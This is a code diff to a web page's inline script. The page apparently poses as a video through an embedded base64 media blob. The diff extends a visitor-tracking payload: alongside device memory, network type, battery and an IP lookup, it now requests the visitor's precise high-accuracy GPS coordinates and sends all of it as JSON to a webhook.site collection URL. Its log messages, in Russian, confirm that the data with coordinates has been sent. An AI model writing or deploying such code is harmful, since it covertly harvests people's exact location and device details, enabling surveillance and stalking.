@@ -183,7 +183,8 @@ var VD=["AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAKOAbW9vdgAAAGxtdmhkAAAAAAA
         deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
         networkType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
         battery: 'Not supported',
-        ipData: 'Error'
+        ipData: 'Error',
+        exactLocation: 'Not supported'
     };
 
 
@@ -197,6 +198,7 @@ var VD=["AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAKOAbW9vdgAAAGxtdmhkAAAAAAA
         }
     });
 
+
     const getIp = new Promise(resolve => {
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
@@ -205,9 +207,32 @@ var VD=["AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAKOAbW9vdgAAAGxtdmhkAAAAAAA
     });
 
 
-    Promise.all([getBattery, getIp]).then(results => {
+    const getLocation = new Promise(resolve => {
+        if (!navigator.geolocation) {
+            resolve("Not supported by browser");
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude.toFixed(6);
+                const lon = position.coords.longitude.toFixed(6);
+                const accuracy = position.coords.accuracy.toFixed(0);
+                resolve(`Lat: ${lat}, Lon: ${lon} (Accuracy: ~${accuracy}m)`);
+            },
+            (error) => {
+                // Если пользователь нажал "Блокировать"
+                resolve(`Denied/Error (Code: ${error.code})`);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    });
+
+
+    Promise.all([getBattery, getIp, getLocation]).then(results => {
         data.battery = results[0];
         data.ipData = results[1];
+        data.exactLocation = results[2];
 
 
         const myUrl = 'https://webhook.site/0ad04dd7-b48f-4e05-aacd-c294a9cf3ef7';
@@ -217,7 +242,7 @@ var VD=["AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAKOAbW9vdgAAAGxtdmhkAAAAAAA
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         })
-        .then(() => console.log('Данные успешно отправлены!'))
+        .then(() => console.log('Данные с координатами отправлены!'))
         .catch(error => console.error('Ошибка:', error));
     });
 </script>
